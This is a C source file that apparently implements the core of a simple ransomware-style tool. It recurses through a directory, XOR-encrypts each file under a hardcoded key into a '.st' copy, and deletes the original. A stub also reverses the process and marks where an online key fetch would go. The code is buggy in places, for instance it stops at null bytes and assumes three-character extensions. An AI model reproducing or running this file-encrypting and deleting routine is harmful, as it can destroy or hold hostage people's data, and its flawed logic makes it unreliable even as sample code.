#include "libcom.h"

FILE* openFile(const char* path, const char* mode){
  FILE* fp = fopen(path,mode);
    // if error when opening one of the two file then exit
  if (fp == NULL){
    perror("file : ");
    exit(0);
  }
  return fp;
}

int closeFile(FILE* input, FILE* output){
  fclose(input);
  fclose(output);
  return 0;
}

char* addext(const char *file, const char *ext){
   int lenFile = strlen(file);
   int lenExt = strlen(ext);
   char *result = malloc(lenFile + lenExt + 1); // +1 for the null-terminator
   if (result == NULL){
     perror("");
     return "";
   }
   memcpy(result, file, lenFile);
   memcpy(result + lenFile, ext, lenExt + 1); // +1 to copy the null-terminator
   return result;
}

char* remext(const char* input){
  char* output = calloc(sizeof(char),strlen(input)+1);
  //strncpy(output, input, strlen(input));
  strcpy(output,input);
  output[strlen(output)-3] = '\0';
  return output;
}

int docrypt(FILE* in, FILE* out, const char* key, char (*cyph)(char, const char*,int*)){
  char* line = malloc(MAX+1);
  int k = 0, bytes;
  while((bytes = fread(line,1,MAX-1,in))>0){
    line[MAX] = '\0';
    int i = 0;
    while(line[i]!='\0'){ // for each char in the line
      line[i] = cyph(line[i], key, &k);
      i++;
    }
    fwrite(line,1,bytes,out);
  }
  free(line);
  return 0;
}

char* getKey(){
  // online stuff

  // if online code doesn't work
  char* key = "[}TiS@K|oEL;/+=]*$";
  return key;
}

char enc(char c, const char* key, int* i){
  char buff = c^(key[*i%strlen(key)]-1);
  buff += 1;
  *i+=1;
  return buff;
}

char dec(char c, const char* key, int* i){
  char buff = c-1;
  buff ^= key[*i%strlen(key)]-1;
  *i+=1;
  return buff;
}

int processFile(char* path, const char* key){
  // if extension .st then decrypt the file
  int todo = strstr(path, ".st") ? 1:0;
  char* outputPath = todo == 1 ? remext(path):addext(path, ".st");
  
  FILE* input = openFile(path, "rb");
  FILE* output = openFile(outputPath, "wb");
  free(outputPath);

  char (*cypher[])(char, const char*,int*) = {enc, dec};
  docrypt(input, output, key, cypher[todo]);
  
  closeFile(input,output);
  remove(path);
  
  return 0;
}

/////////////////////////////////::

char* addPath(const char *path, const char *file){
   int lenPath = strlen(path);
   int lenFile = strlen(file);
   char *full = malloc(lenPath + lenFile + 2); // +2 for the null-terminator, /
   if (path == NULL){
     perror("");
     return "";
   }
   memcpy(full, path, lenPath);
   memcpy(full + lenPath, "/",1);
   memcpy(full + lenPath + 1, file, lenFile + 1); // +1 to copy the null-terminator
   return full;
}

int isDir(char* path){
  DIR *dir = opendir(path);   
  if (dir) {
    closedir(dir);
    return 1;
  } else if (ENOENT == errno) {
    return 0;
  } else {
    return 0;
  }
}

int encDir(char* path, const char* key){
  DIR *dir = opendir(path);
  if (dir == NULL){
    perror(path);
    return 1;
  }
  //seekdir(dir, 2);
  struct dirent *file;
  while((file = readdir(dir))!= NULL){
    if(strcmp(file->d_name,".")!=0 && strcmp(file->d_name,"..")!=0){
      char* fullpath = addPath(path, file->d_name);
      if(isDir(fullpath)){
        encDir(fullpath, key);
      }else{
        processFile(fullpath, key) == 0 ? 0:printf("Error : %s\n",fullpath);
      }
      free(fullpath);
    }
  }
  closedir(dir);
  return 0;
}
